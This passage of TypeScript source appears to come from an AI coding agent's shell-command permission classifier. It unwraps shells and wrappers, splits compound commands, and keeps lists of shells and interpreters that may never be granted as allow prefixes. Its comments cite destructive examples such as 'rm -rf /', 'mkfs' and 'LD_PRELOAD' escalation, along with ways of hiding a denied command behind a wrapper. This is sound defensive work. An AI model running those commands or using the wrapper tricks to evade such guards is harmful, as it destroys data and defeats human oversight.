      } else if (path.isAbsolute(cleaned) || WINDOWS_DRIVE_ROOT_REGEX.test(cleaned.replace(/\\/g, '/'))) {
        resolved = cleaned;
      } else {
        resolved = path.resolve(cwd, cleaned);
      }
      if (isDangerousRemovalPath(resolved)) return true;
    }
  }
  return false;
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/**
 * Shell wrappers that execute their arguments as commands.
 * If we see these, we must also classify the inner command.
 */
const SHELL_WRAPPERS = new Set([
  'bash', 'sh', 'zsh', 'dash', 'fish', 'ksh', 'csh', 'tcsh',
  // Windows shells + `.exe` variants. Like the Unix shells above, each execs its
  // `-Command`/`-c` (powershell/pwsh) or `/c`,`/k` (cmd) argument as a command,
  // so it must be unwrapped during decomposition — otherwise a denied inner
  // command hides behind `powershell -Command "<denied>"` / `pwsh -c …` /
  // `cmd /c …` / `bash.exe -c …` and the deny/allow rule never sees it. This is
  // the decomposition half of the protection BARE_SHELL_PREFIXES already gives
  // at the prefix-suggestion boundary (the reference's DANGEROUS_SHELL_PREFIXES).
  'cmd', 'cmd.exe', 'powershell', 'powershell.exe', 'pwsh', 'pwsh.exe', 'bash.exe',
  'env', 'sudo', 'su', 'doas', 'nohup', 'nice', 'timeout',
  'xargs', 'exec', 'eval',
  // `time <cmd>` measures the inner command's runtime — the SAFETY of the line is
  // the safety of the inner command, so unwrap it (the reference's `time` command spec).
  'time',
  // `stdbuf [opts] <cmd>` only tweaks the inner command's stdio buffering — the
  // safety of the line is the inner command's. bash-security's SAFE_WRAPPERS
  // already unwraps `stdbuf`; add it here too so the two layers agree and the
  // existing stdbuf operand-skip below becomes reachable.
  'stdbuf',
  // `srun [opts] <cmd>` is a SLURM launcher whose trailing operand is itself a
  // command run on cluster nodes (the reference's srun spec marks that arg isCommand).
  // Unwrap it so `srun rm -rf /` / `srun mkfs …` classify on the INNER command
  // rather than the opaque `srun` token.
  'srun',
  'watch', 'ionice', 'setarch', 'taskset', 'chrt', 'strace', 'ltrace',
]);

function extractBaseCommands(command: string, depth = 0): string[] {
  const commands: string[] = [];

  // Bounded recursion: a pathologically deep wrapper/substitution chain must not
  // blow the stack or hang the permission check (DoS). Mirrors the reference's
  // recursionDepth>10 guard — stop descending past the cap.
  if (depth > MAX_COMMAND_PARSE_DEPTH) return commands;

  // 0. Unwrap shell control structures so for/while/if bodies are classified
  command = unwrapShellControlStructures(command);

  function extractDelimited(
    cmd: string,
    match: (c: string, idx: number, src: string) => { innerStart: number; end: number } | null,
  ): void {
    let i = 0;
    while (i < cmd.length) {
      const m = match(cmd[i], i, cmd);
      if (m) {
        commands.push(...extractBaseCommands(cmd.slice(m.innerStart, m.end), depth + 1));
        i = m.end + 1;
      } else {
        i++;
      }
    }
  }

  // 1. Extract commands from $(...) and `...` substitutions
  extractDelimited(command, (ch, i, src) => {
    if (ch === '$' && i + 1 < src.length && src[i + 1] === '(') {
      const end = findMatchingParen(src, i + 2);
      return end !== -1 ? { innerStart: i + 2, end } : null;
    }
    if (ch === '`') {
      const end = src.indexOf('`', i + 1);
      return end !== -1 ? { innerStart: i + 1, end } : null;
    }
    return null;
  });

  // 2. Extract commands from subshells (...)
  extractDelimited(command, (ch, i, src) => {
    if (ch === '(' && (i === 0 || src[i - 1] !== '$')) {
      const end = findMatchingParen(src, i + 1);
      return end !== -1 ? { innerStart: i + 1, end } : null;
    }
    return null;
  });

  // 3. Split on pipes, semicolons, newlines, && and ||
  const segments = command.split(/\s*(?:\|\||&&|[|;\n])\s*/);

  for (const segment of segments) {
    const trimmed = segment.trim();
    if (!trimmed || trimmed.startsWith('#')) continue;

    const tokens = trimmed.split(/\s+/);
    let i = 0;

    // Skip environment variable assignments
    while (i < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[i]!)) {
      i++;
    }

    if (i >= tokens.length) continue;

    let cmd = tokens[i]!;

    // Unwrap shell wrappers: env cmd, sudo cmd, bash -c "cmd"
    while (SHELL_WRAPPERS.has(cmd) && i + 1 < tokens.length) {
      const wrapper = cmd;
      commands.push(cmd);
      i++;
      // Skip flags (e.g., sudo -u root, bash -c). Windows shells use `/`-prefixed
      // single-letter switches (`cmd /c`, `cmd /k`, and inert ones like `/q`), so
      // treat an exact `/x` (optionally `/x:value`) token as a flag too — without
      // this the loop would stop at `/c` and mis-read it as the wrapped command.
      // A real path operand (`/usr/bin`) is >1 char after the slash and is left
      // untouched (the switch pattern is anchored to a single letter).
      while (i < tokens.length && (tokens[i]!.startsWith('-') || /^\/[a-zA-Z]$/.test(tokens[i]!))) {
        const flag = tokens[i]!;
        i++;
        // Command-payload flags take the rest of the tokens as a command string —
        // parse it: `-c` (bash/zsh/pwsh), `-Command` (powershell/pwsh), and the
        // cmd-style `/c` / `/k`.
        if ((flag === '-c' || /^-command$/i.test(flag) || /^\/[ck]$/i.test(flag)) && i < tokens.length) {
          const innerCmd = tokens.slice(i).join(' ').replace(/^["']|["']$/g, '');
          commands.push(...extractBaseCommands(innerCmd, depth + 1));
          i = tokens.length;
          break;
        }
        // `srun` has value-taking options that consume the NEXT token as a count
        // (`-n 4`, `--ntasks 4`, `-N 2`, `--nodes 2`). The generic flag skip above
        // only drops the `-flag` token itself, so without this the count operand
        // would be mis-read as the wrapped command. Mirrors the reference's srun spec
        // option model so `srun -n 4 rm -rf /` reaches the inner `rm`.
        if (wrapper === 'srun' && SRUN_VALUE_FLAGS.test(flag)
            && i < tokens.length && /^\d/.test(tokens[i]!)) {
          i++;
        }
        // Value-taking wrapper flags (`timeout -s KILL`, `timeout -k 3`, `stdbuf
        // -o L`, `nice -n 5`) consume the NEXT token as their operand. The generic
        // flag skip above drops only the `-flag` token, so without this the operand
        // (`KILL`/`L`/`5`) is mis-read as the wrapped command — e.g. `timeout -s
        // KILL 5 rm -rf /` would classify as `KILL` instead of reaching `rm`.
        // Shared WRAPPER_VALUE_FLAGS table keeps this operand knowledge in one place.
        const wrapperValueFlag = WRAPPER_VALUE_FLAGS[wrapper];
        if (wrapperValueFlag && wrapperValueFlag.test(flag) && i < tokens.length
            && !tokens[i]!.startsWith('-')) {
          i++;
        }
      }
      // Skip a leading duration/priority operand so the WRAPPED command is
      // reached: `timeout 30 ls` -> ls, `nice 10 ls` -> ls (mirrors
      // stripSafeWrappers in bash-security). Without this the base command is
      // mis-detected as the numeric token and classified unsafe (S7).
      if ((wrapper === 'timeout' || wrapper === 'stdbuf') && i < tokens.length && /^[\d.]/.test(tokens[i]!)) {
        i++;
      } else if (wrapper === 'nice' && i < tokens.length && /^\d+$/.test(tokens[i]!)) {
        i++;
      }
      // After unwrapping a shell wrapper (especially env), skip env var
      // assignments (e.g., env PATH=/usr/bin ls -> skip PATH=/usr/bin)
      while (i < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[i]!)) {
        i++;
      }
      if (i < tokens.length) {
        cmd = tokens[i]!;
      }
    }

    if (i < tokens.length) {
      commands.push(cmd);
      if (i + 1 < tokens.length) {
        commands.push(cmd + ' ' + tokens[i + 1]!);
        if (i + 2 < tokens.length) {
          commands.push(cmd + ' ' + tokens[i + 1]! + ' ' + tokens[i + 2]!);
        }
      }
      // Spec-driven subcommand prefix: for a CLI with a known option schema, ALSO
      // emit the `command subcommand` form reached after skipping leading global
      // flags and the values they consume, so `git -C /repo status` yields the
      // `git status` base (not just `git -C /repo`) and matches SAFE_PREFIXES.
      // Added alongside the raw adjacent-token bases above — never replaces them —
      // so existing matches are preserved. Mirrors the reference's findFirstSubcommand
      // spec-driven flag-value skipping (utils/shell/specPrefix.ts).
      const spec = bashSpecFor(cmd);
      if (spec) {
        const sub = skipGlobalFlags(tokens, i + 1, spec);
        if (sub !== i + 1 && sub < tokens.length && !tokens[sub]!.startsWith('-')) {
          commands.push(cmd + ' ' + tokens[sub]!);
          if (sub + 1 < tokens.length && !tokens[sub + 1]!.startsWith('-')) {
            commands.push(cmd + ' ' + tokens[sub]! + ' ' + tokens[sub + 1]!);
          }
        }
      }
    }
  }

  // 4. Detect dangerous redirects to system paths
  if (/>\s*\/etc\/|>\s*\/usr\/|>\s*\/bin\//i.test(command)) {
    commands.push('redirect-to-system-path');
  }

  return commands;
}

function allSegmentsKnown(command: string): boolean {
  const unwrapped = unwrapShellControlStructures(command);
  const segments = unwrapped.split(/\s*(?:\|\||&&|[|;])\s*/).filter(s => s.trim());
  if (segments.length <= 1) return true;
  for (const seg of segments) {
    const tokens = seg.trim().split(/\s+/);
    let i = 0;
    while (i < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[i]!)) i++;
    if (i >= tokens.length) continue;
    const cmdTokens = tokens.slice(i);
    let found = false;
    for (let j = 1; j <= Math.min(cmdTokens.length, 3); j++) {
      const prefix = cmdTokens.slice(0, j).join(' ');
      if (SAFE_COMMANDS.has(prefix) || SAFE_PREFIXES.has(prefix)) { found = true; break; }
    }
    // Spec-driven retry: if the raw first-N tokens didn't match, skip leading
    // global flags (and their values) for a known-schema CLI and test the
    // flag-skipped `command subcommand` prefix, so `git -C /repo status` matches
    // `git status`. Mirrors the reference's spec-driven prefix extraction.
    if (!found && cmdTokens.length > 0) {
      const spec = bashSpecFor(cmdTokens[0]!);
      if (spec) {
        const sub = skipGlobalFlags(cmdTokens, 1, spec);
        for (let j = 2; j <= 3 && sub + (j - 2) < cmdTokens.length; j++) {
          const prefix = cmdTokens[0]! + ' ' + cmdTokens.slice(sub, sub + (j - 1)).join(' ');
          if (SAFE_PREFIXES.has(prefix)) { found = true; break; }
        }
      }
    }
    if (!found) return false;
  }
  return true;
}

/**
 * Benign edit-adjacent filesystem-mutation commands that `acceptEdits` mode may
 * auto-allow, mirroring the reference's ACCEPT_EDITS_ALLOWED_COMMANDS
 * ([mkdir, touch, rm, rmdir, mv, cp, sed]). AMI DELIBERATELY excludes `rm`/`rmdir`:
 * its destructive-command safety invariant keeps every deletion gated behind an
 * explicit prompt even in acceptEdits (an intentional superset divergence —
 * never regress a delete guard). `sed` is included because `sed -i` is an edit.
 */
const ACCEPT_EDITS_FS_COMMANDS = new Set(['mkdir', 'touch', 'mv', 'cp', 'sed']);

/**
 * The file-mutating tools that `acceptEdits` mode auto-allows. SINGLE source of
 * truth shared by {@link PermissionManager.check} (the acceptEdits fast-path) and
 * {@link buildPermissionSuggestions} (the "switch to acceptEdits" blocked-edit
 * affordance), so the set a suggestion offers to unlock can never drift from the
 * set the mode actually unlocks.
 */
const ACCEPT_EDITS_EDIT_TOOLS: ReadonlySet<string> = new Set(['file_edit', 'file_write', 'notebook_edit', 'multi_edit']);

/**
 * True when EVERY sub-command of `command` is a benign filesystem-mutation base
 * command ({@link ACCEPT_EDITS_FS_COMMANDS}). Used by `acceptEdits` mode to
 * auto-allow file-edit-adjacent shell work (`mkdir`, `touch`, `mv`, `cp`,
 * `sed -i`) the way the reference does — without broadening to arbitrary commands.
 * A command substitution (`$(...)`, backticks, `$VAR`) is rejected outright so it
 * cannot smuggle a non-fs command into an otherwise-benign invocation.
 *
 * On Windows the bash tool runs PowerShell, so a single benign PowerShell write
 * cmdlet (`Set-Content`/`Add-Content`/`Out-File`/`Tee-Object`/`New-Item` file|dir)
 * is ALSO auto-allowed — the Windows counterpart of the POSIX set — via
 * {@link isAcceptEditsPowerShellWrite}, which fails closed and excludes
 * `Remove-Item` and `New-Item` link creation (parity: the reference's PowerShell
 * modeValidation write-cmdlet allowlist + link-creation detection).
 */
export function isAcceptEditsFilesystemMutation(command: string): boolean {
  const trimmed = command.trim();
  if (!trimmed) return false;
  if (containsShellSubstitution(trimmed) || trimmed.includes('`')) return false;
  const subs = splitCompoundCommand(trimmed);
  if (subs.length === 0) return false;
  const allBashFsMutations = subs.every(sub => {
    const base = stripEnvVarPrefix(sub, /* safeEnvOnly */ false).trim().split(/\s+/)[0];
    return !!base && ACCEPT_EDITS_FS_COMMANDS.has(base);
  });
  if (allBashFsMutations) return true;
  // Not an all-bash-fs compound — accept a lone benign PowerShell write cmdlet.
  return isAcceptEditsPowerShellWrite(trimmed);
}

/**
 * Introspection accessor: the bash base-commands a given permission {@link
 * PermissionMode} auto-approves without a prompt, SORTED for stable display.
 * Only `acceptEdits` auto-allows a fixed edit-adjacent set (the SAME canonical
 * {@link ACCEPT_EDITS_FS_COMMANDS} the runtime {@link isAcceptEditsFilesystemMutation}
 * gate uses — no duplicate table); every other mode returns an empty list (their
 * auto-approval is classification-driven, not a fixed command set). Mirrors
 * the reference's `getAutoAllowedCommands(mode)` (BashTool/modeValidation.ts), adapted to
 * AMI's superset divergence that excludes `rm`/`rmdir` so deletions stay gated.
 * Surfaced through {@link getDefaultPermissionPatterns} (→ `/permissions defaults`)
 * so a user can see exactly which commands acceptEdits waves through.
 */
export function getAutoAllowedCommands(mode: PermissionMode): readonly string[] {
  return mode === 'acceptEdits' ? [...ACCEPT_EDITS_FS_COMMANDS].sort() : [];
}

/**
 * Is a single `gh` invocation (tokens beginning at the `gh` token) a genuinely
 * read-only form? True only when the leading `<group> <subcommand>` pair is in
 * {@link GH_READ_ONLY_SUBCOMMANDS} AND no argument targets a foreign host
 * ({@link ghArgsTargetForeignHost}). A non-`gh` token list is not our concern
 * (returns true). Everything unlisted (`gh pr create`, `gh api`, bare `gh`) is
 * NOT read-only, so it falls through to a prompt. Mirrors the reference's per-command
 * GH_READ_ONLY_COMMANDS lookup + dangerous-callback.
 */
export function isGhInvocationReadOnly(tokens: string[]): boolean {
  if (tokens[0] !== 'gh') return true; // not a gh invocation — not our concern
  // Collect the leading non-flag words (the command group + subcommand). gh has no
  // value-taking GLOBAL flags before the command group, so a leading flag means an
  // unrecognized form (e.g. `gh --version`) that is not auto-approvable.
  const words: string[] = [];
  let idx = 1;
  for (; idx < tokens.length && words.length < 2; idx++) {
    const t = tokens[idx]!;
    if (t.startsWith('-')) break;
    words.push(t);
  }
  if (words.length < 2) return false; // bare `gh` / `gh <group>` without a subcommand
  const pair = `${words[0]} ${words[1]}`;
  if (!GH_READ_ONLY_SUBCOMMANDS.has(pair)) return false;
  return !ghArgsTargetForeignHost(tokens.slice(1 + words.length));
}

/**
 * Whole-command `gh` read-only guard for the bash classifier — the gh analogue of
 * {@link isGitReadOnlyCommandSafe}. Splits a (possibly compound) command into
 * segments and refuses if ANY `gh` invocation is not a read-only form
 * ({@link isGhInvocationReadOnly}). Non-gh segments are classified by the rest of
 * the classifier (destructive/unsafe guards run before this), so a compound that
 * pairs a safe `gh` read with a write is not whitewashed here.
 */
export function isGhReadOnlyCommandSafe(command: string): boolean {
  const unwrapped = unwrapShellControlStructures(command);
  const segments = unwrapped.split(/\s*(?:\|\||&&|[|;])\s*/).filter(s => s.trim());
  for (const seg of segments) {
    const tokens = seg.trim().split(/\s+/);
    let i = 0;
    while (i < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[i]!)) i++;
    if (tokens[i] === 'gh') {
      if (!isGhInvocationReadOnly(tokens.slice(i))) return false;
    }
  }
  return true;
}

/**
 * Does `command` invoke `git` as a base command (compound-aware)? Env-var prefixes
 * (`GIT_DIR=… git …`) and leading `sudo`/`env`-style wrappers are peeled by the
 * shared {@link extractBaseCommands} decomposition, so `git`, `GIT_DIR=x git log`,
 * and `cd x && git status` all report true. Used to gate git invocations behind the
 * disguised-bare-repo boundary check in {@link PermissionManager.check}.
 */
export function commandInvokesGit(command: string): boolean {
  return extractBaseCommands(command).some(b => isNormalizedGitCommand(b) || b.startsWith('git '));
}

/**
 * Match a simple glob-like pattern against a string.
 * Supports '*' as a wildcard for any sequence of characters.
 */
/**
 * Compile+cache a glob pattern's regex, bounded via the shared LRU memoizer so a
 * long-lived process matching many distinct rules can never grow this cache
 * without bound (dotAll `s`: `*` also spans embedded newlines, so a rule like
 * `*rm -rf*` still matches a multi-line command and a deny cannot be bypassed by
 * splitting the command across lines — the reference's dotAll wildcard matching).
 */
const _compilePattern = memoizeWithLRU(
  // The cache key is prefixed with `i` (case-insensitive) or `s` (case-sensitive)
  // so the two flavours of the same pattern don't collide in the LRU.
  (key: string): RegExp => new RegExp(`^${globToRegexSource(key.slice(1))}$`, key[0] === 'i' ? 'si' : 's'),
  (key: string) => key,
  1000,
);
/**
 * Match a glob-like pattern (only `*` is special, expanding to any run of
 * characters; every other metachar is escaped) against a value. This is the
 * canonical wildcard matcher reused by MCP-server allowlists, permission rules
 * and the HTTP-hook URL allowlist — do not re-implement it per site.
 *
 * `caseInsensitive` (default false) adds the regex `i` flag, mirroring the reference's
 * `matchWildcardPattern(pattern, command, caseInsensitive)` (shellRuleMatching.ts
 * L90-L94/L150). It is used for case-insensitive filesystems (macOS/Windows) where
 * a path deny/allow rule should match regardless of letter-case.
 */
export function wildcardMatch(pattern: string, value: string, caseInsensitive = false): boolean {
  return matchPattern(pattern, value, caseInsensitive);
}

function matchPattern(pattern: string, value: string, caseInsensitive = false): boolean {
  if (pattern.includes('\x00') || value.includes('\x00')) return false;
  // Length cap (shared with the untrusted-regex pre-validator): a permission/
  // hook matcher comes from settings, a plugin's hooks.json, or a model-supplied
  // plan-mode rule. Each `*` expands to `.*`, so a pathologically long matcher
  // compiles into a correspondingly huge regex whose `^.*…$` scan over a crafted
  // value is a ReDoS vector on the single engine thread. A matcher far longer
  // than any legitimate command/URL/path is refused (never matches) up front,
  // before it can be compiled or run — mirroring the length cap in
  // {@link findUnsafePatternReason}. The literal `*` match-all above is exempt.
  if (pattern.length > DEFAULT_MAX_PATTERN_LENGTH) return false;
  if (pattern === '*') return true;
  if (caseInsensitive
    ? pattern.toLowerCase() === value.toLowerCase()
    : pattern === value) return true;

  return _compilePattern((caseInsensitive ? 'i' : 's') + pattern).test(value);
}

/**
 * Match a ROOTED file-rule pattern (`//…`, `~/…`, `/…`) against an absolute
 * candidate path after resolving the pattern against its root via
 * {@link patternWithRoot}. Returns `null` for a root-agnostic (bare / `./`) pattern
 * so the caller falls back to AMI's existing raw-glob matcher — this keeps
 * bare-pattern behavior byte-for-byte unchanged and makes the rooted-form resolution
 * purely ADDITIVE (it can only make a rooted rule that previously could not match
 * start matching the file it names).
 *
 * A trailing `/**` is treated gitignore-style: it matches BOTH the directory itself
 * and everything inside it (parity with the reference stripping `/**` before handing the
 * pattern to the `ignore` library, which matches a bare `dir` against `dir` and
 * `dir/anything`).
 */
export function matchRootedFileRulePattern(
  pattern: string,
  absPath: string,
  opts: { sourceRoot?: string; home?: string; caseInsensitive?: boolean } = {},
): boolean | null {
  const { relativePattern, root } = patternWithRoot(
    pattern,
    opts.sourceRoot ?? process.cwd(),
    opts.home ?? os.homedir(),
  );
  if (root === null) return null; // root-agnostic — caller uses the raw matcher
  const ci = opts.caseInsensitive ?? false;
  const absPattern = path.posix.join(root.replace(/\\/g, '/'), relativePattern);
  const candidate = absPath.replace(/\\/g, '/');
  if (absPattern.endsWith('/**')) {
    const base = absPattern.slice(0, -3);
    if (ci ? candidate.toLowerCase() === base.toLowerCase() : candidate === base) return true;
  }
  return matchPattern(absPattern, candidate, ci);
}

/**
 * Match a bash command against a permission rule pattern, handling:
 * 1. Line continuation normalization (\<newline> → join)
 * 2. Compound command decomposition:
 *    - allow rules: ALL sub-commands must match (prevents "git status && rm -rf /")
 *    - deny rules: ANY sub-command matching triggers deny
 */
export function stripEnvVarPrefix(cmd: string, safeEnvOnly = false): string {
  // Allow-rule matching passes safeEnvOnly=true: only provably-harmless env vars
  // (SAFE_ENV_VARS) are stripped, so an escalation prefix like `PATH=/evil` or
  // `LD_PRELOAD=x` STAYS in the command and breaks the match — forcing a prompt
  // instead of silently auto-approving. Deny/ask matching strips ALL assignments
  // aggressively so a denied command cannot hide behind any env-var prefix.
  // Mirrors the reference's split (allow = safe-list strip, deny = strip-all).
  if (safeEnvOnly) {
    // Drop leading assignments one at a time, but STOP at the first non-safe var
    // (it stays, breaking any allow match). The command tail is preserved exactly.
    // Allow matching is single-pass and never strips wrappers — auto-approving a
    // wrapped/escalated form (`sudo git status`) must NOT match a `git status`
    // allow rule — so de-obfuscation can only ever force a prompt, never broaden.
    let s = cmd;
    for (;;) {
      const m = s.match(/^\s*([A-Za-z_]\w*)=(?:"[^"]*"|'[^']*'|\S+)\s+/);
      if (!m || !SAFE_ENV_VARS.has(m[1]!)) break;
      s = s.slice(m[0].length);
    }
    return s;
  }
  // Deny/ask matching: strip ALL leading env assignments AND privilege/shell
  // wrappers (sudo, env, bash -c, eval, timeout, …), iterating both to a FIXED
  // POINT so interleaved layers fully reduce. A single pass stops at the first
  // non-wrapper token, so `timeout 5 FOO=bar curl` would keep the `FOO=bar`
  // prefix and miss a `curl` deny rule; looping reduces it to `curl` (strip
  // `timeout 5` → strip `FOO=bar` → `curl`). Mirrors the reference's fixed-point
  // composition of stripSafeWrappers + stripAllLeadingEnvVars for deny rules.
  let stripped = cmd;
  for (;;) {
    const before = stripped;
    // eslint-disable-next-line security/detect-unsafe-regex -- anchored, disjoint alternation
    stripped = stripped.replace(/^(\s*[A-Za-z_]\w*=(?:"[^"]*"|'[^']*'|\S+)\s+)+/, '');
    const tokens = stripped.split(/\s+/);
    let i = 0;
    while (i < tokens.length && SHELL_WRAPPERS.has(tokens[i]!)) {
      i++;
      // Skip flags — including Windows cmd-style `/c`, `/k`, `/q` switches (an
      // exact `/x` or `/x:value` token), so `cmd /c <denied>` reduces to the
      // inner command. A path operand (`/usr/bin`) is >1 char and is preserved.
      while (i < tokens.length && (tokens[i]!.startsWith('-') || /^\/[a-zA-Z]$/.test(tokens[i]!))) i++;
      while (i < tokens.length && /^[A-Za-z_]\w*=/.test(tokens[i]!)) i++;
      // A numeric operand belongs to the wrapper, not the wrapped command:
      // `timeout 5 CMD` / `timeout 1m CMD` (duration), `nice 10 CMD` /
      // `ionice 2 CMD` (priority). Skip it so the deny/ask match reaches the real
      // command (`timeout 5 rm -rf /` must still hit a `rm` deny rule).
      while (i < tokens.length && /^\d+[smhd]?$/.test(tokens[i]!)) i++;
    }
    if (i > 0 && i < tokens.length) stripped = tokens.slice(i).join(' ');
    if (stripped === before) break;
  }
  return stripped;
}

/**
 * Bare single-word prefixes that must NEVER be offered as an "allow always"
 * scope: shells and arg-executing wrappers (a `bash:*` / `env:*` / `sudo:*` rule
 * auto-approves arbitrary code via `-c` or by wrapping any command) plus
 * cross-platform code interpreters (a `node:*` / `python:*` rule would
 * auto-allow arbitrary code execution). Mirrors the reference's BARE_SHELL_PREFIXES +
 * NEVER_SUGGEST / CROSS_PLATFORM_CODE_EXEC denylists.
 */
export const BARE_SHELL_PREFIXES = new Set([
  'sh', 'bash', 'zsh', 'fish', 'csh', 'tcsh', 'ksh', 'dash', 'cmd', 'powershell', 'pwsh',
  // Windows `.exe` shell variants — a cross-platform payload can name the
  // interpreter as `bash.exe` / `powershell.exe` / `cmd.exe`; these must be
  // denied as a grantable prefix exactly like their bare forms (the reference's
  // DANGEROUS_SHELL_PREFIXES lists cmd.exe/powershell.exe/pwsh.exe/bash.exe).
  'cmd.exe', 'powershell.exe', 'pwsh.exe', 'bash.exe', 'sh.exe', 'zsh.exe',
  'fish.exe', 'csh.exe', 'tcsh.exe', 'ksh.exe', 'dash.exe',
  // wrappers that exec their args as a command
  'env', 'xargs', 'nice', 'stdbuf', 'nohup', 'timeout', 'time',
  // privilege escalation
  'sudo', 'doas', 'pkexec',
  // cross-platform code-exec interpreters
  'node', 'deno', 'bun', 'python', 'python3', 'ruby', 'perl', 'php', 'osascript', 'iex',
]);

/**
 * True if `word` names a shell/interpreter/wrapper executable that must never be
 * treated as a permission-granting prefix — matched case-insensitively so
 * Windows-style `Bash.EXE` / `PowerShell.exe` are caught too. Mirrors the reference's
 * DANGEROUS_SHELL_PREFIXES guard (utils/shell/prefix.ts): accepting e.g. `bash`
 * (or a scoped `bash foo`) as a prefix would let any command through the shell
 * and defeat the permission system.
 */
export function isBareShellPrefix(word: string): boolean {
  return BARE_SHELL_PREFIXES.has(word.toLowerCase());
}

/**
 * Commands that take subcommands or depth-scoped flags: a bare single-word
 * `git:*` / `docker:*` rule would auto-allow dangerous subcommands forever
 * (`git push --force`, `docker run`). For these we refuse a bare-root suggestion
 * and require the two-word `command subcommand` form (or fall back to the exact
 * command). Mirrors the reference's DEPTH_RULES + "fig-spec declares subcommands"
 * bare-root guard (staticPrefix.ts L142-156).
 */
export const SUBCOMMAND_AWARE_ROOTS = new Set([
  'git', 'gh', 'docker', 'kubectl', 'az', 'aws', 'gcloud', 'npm', 'pnpm', 'yarn',
  'cargo', 'go', 'pip', 'pip3', 'brew', 'apt', 'apt-get', 'dnf', 'yum', 'pacman',
  'systemctl', 'terraform', 'helm', 'make',
]);

/**
 * Interpreters whose scoped prefix is driven by the structured per-argument spec
 * ({@link buildSpecPrefix}) rather than the generic subcommand-shape walk: a
 * module run (`python -m <module>`) folds the module into the prefix while an
 * inline-code run (`python -c`, `node -e`) stops at the interpreter. Every name
 * here is also a {@link BARE_SHELL_PREFIXES} entry (so the suggestion layer still
 * refuses a bare interpreter prefix); the ONLY form that survives is the scoped
 * module invocation (see {@link isScopedModulePrefix}). Mirrors the reference's
 * interpreter `-c`/`-m` special-casing in prefix extraction (specPrefix.ts).
 */
const INTERPRETER_SPEC_NAMES: ReadonlySet<string> = new Set([
  'python', 'python3', 'node', 'ruby', 'perl',
]);

export const BASH_COMMAND_SPECS: Record<string, BashCommandSpec> = {
  git: { valueFlags: new Set(['-C', '-c', '--git-dir', '--work-tree', '--exec-path', '--namespace']) },
  docker: { valueFlags: new Set(['-H', '--host', '--context', '--config', '-l', '--log-level']), depth: 3 },
  kubectl: {
    valueFlags: new Set(['-n', '--namespace', '--context', '--kubeconfig', '--cluster', '--user', '--server', '--as']),
    depth: 3,
  },
  helm: { valueFlags: new Set(['-n', '--namespace', '--kube-context', '--kubeconfig']), depth: 3 },
  aws: { valueFlags: new Set(['--region', '--profile', '--endpoint-url', '--output', '--cli-read-timeout']), depth: 4 },
  az: { valueFlags: new Set(['--subscription', '--output', '-o']), depth: 4 },
  gcloud: {
    valueFlags: new Set(['--project', '--account', '--configuration', '--format', '--verbosity']),
    depth: 4,
    // the reference's DEPTH_RULES compound keys: `gcloud compute`/`gcloud beta` nest
    // deeper (service → resource → verb) so a 4-word prefix stops short of the
    // real leaf; 6 reaches it.
    subcommandDepth: { compute: 6, beta: 6 },
  },
  // .NET CLI: a meaningful action lives at the 3rd word (`dotnet tool install`,
  // `dotnet nuget push`, `dotnet workload install`) — parity with the reference's
  // DEPTH_RULES[dotnet]=3. No global value-flags worth skipping before the verb.
  dotnet: { valueFlags: new Set(['-v', '--verbosity']), depth: 3 },
  npm: { valueFlags: new Set(['--prefix', '-w', '--workspace', '--registry']) },
  pnpm: { valueFlags: new Set(['--prefix', '-w', '--workspace', '--filter', '-C', '--dir']) },
  yarn: { valueFlags: new Set(['--cwd']) },
  cargo: { valueFlags: new Set(['-Z', '--color', '--config']) },
};

/**
 * Resolve the {@link BashCommandSpec} for a command: the hand-maintained
 * {@link BASH_COMMAND_SPECS} table first, then — for a command the table does not
 * cover — a spec derived from the extensible command-spec registry's built-in
 * value-flags ({@link valueFlagsForCommand}). This is the wiring that lets the
 * registry widen flag-value skipping (and thus SAFE_PREFIXES matching) to more
 * CLIs (e.g. `make -C dir test` → `make test`) without a second hardcoded table.
 */
function bashSpecFor(cmd: string): BashCommandSpec | undefined {
  const existing = BASH_COMMAND_SPECS[cmd];
  if (existing) return existing;
  const valueFlags = valueFlagsForCommand(cmd);
  return valueFlags ? { valueFlags } : undefined;
}

/**
 * Scoped subcommand prefix ("command subcommand", e.g. `git commit`, `npm run`,
 * `kubectl get pods`). Skips leading SAFE_ENV_VARS assignments (returns null on
 * an unsafe env var so matching falls back to the exact command), then — spec
 * driven — skips leading global flags AND the values they consume (`git -C /repo
 * status` → `git status`) before resolving the first real subcommand. Extends to
 * the command's spec `depth` (default 2) so deep CLIs like `docker`/`kubectl`/
 * `aws` yield a usefully-scoped prefix instead of a bare root. Returns null when
 * no subcommand-shaped token follows the command (a flag, path, number or
 * filename), so the caller falls back to the first-word / exact-command rule.
 * Mirrors the reference's getSimpleCommandPrefix + spec-driven flag-value skipping +
 * DEPTH_RULES.
 */
export function getSimpleCommandPrefix(command: string): string | null {
  const tokens = command.trim().split(/\s+/).filter(Boolean);
  if (tokens.length === 0) return null;
  let i = 0;
  while (i < tokens.length && ENV_VAR_ASSIGN_RE.test(tokens[i]!)) {
    if (!SAFE_ENV_VARS.has(tokens[i]!.split('=')[0]!)) return null;
    i++;
  }
  const cmd = tokens[i];
  if (!cmd) return null;
  // Interpreter module/inline-code prefix: `python -m <module>` folds the module
  // into a scoped prefix; `python -c <code>` / `node -e <code>` stop at the
  // interpreter (→ 1 word → null → no scoped rule). Driven by the structured
  // isModule/isCommand/isDangerous attributes on the command spec, not the generic
  // subcommand-shape walk below (a module name like `http.server` is not
  // subcommand-shaped). Mirrors the reference's buildPrefix (utils/shell/specPrefix.ts).
  if (INTERPRETER_SPEC_NAMES.has(cmd.toLowerCase())) {
    const aspec = getArgCommandSpec(cmd.toLowerCase());
    if (aspec) {
      const p = buildSpecPrefix(cmd, tokens.slice(i + 1), aspec);
      return p.split(' ').length >= 2 ? p : null;
    }
  }
  const spec = bashSpecFor(cmd);
  // Skip leading global flags (and any value they consume) to reach the subcommand.
  i = skipGlobalFlags(tokens, i + 1, spec);
  // Resolve the effective depth: a COMPOUND (`command firstSubcommand`) override
  // from the spec's `subcommandDepth` wins over the command's default `depth`, so
  // a deep subcommand tree (`gcloud compute …`) extends to its real leaf while a
  // shallow sibling keeps the default. Mirrors the reference's DEPTH_RULES compound-key
  // lookup (`${command} ${sub}` before the bare `${command}`).
  let depth = spec?.depth ?? 2;
  const firstSub = tokens[i];
  if (firstSub && spec?.subcommandDepth) {
    const override = spec.subcommandDepth[firstSub.toLowerCase()];
